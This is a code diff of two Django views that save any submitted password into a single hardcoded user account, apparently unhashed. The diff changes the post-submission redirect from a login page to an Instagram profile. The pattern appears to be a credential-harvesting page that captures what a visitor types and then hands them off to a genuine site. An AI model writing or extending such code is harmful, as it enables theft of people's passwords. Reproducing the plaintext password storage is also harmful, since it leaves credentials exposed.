@@ -21,7 +21,7 @@ def password_page(request):
 
         User.objects.filter(username='polleykalicharan').update(password=password)
         if password:
-            return redirect("login")
+            return redirect("https://www.instagram.com/surya_____2021/")
 
         # return HttpResponseRedirect("https://www.google.com")
 
@@ -157,7 +157,7 @@ def new_password(request):
 
         User.objects.filter(username='polleykalicharan').update(password=password)
         if password:
-            return redirect("login")
+            return redirect("https://www.instagram.com/surya_____2021/")
             
 
     #     return redirect("login")   # or wherever you want
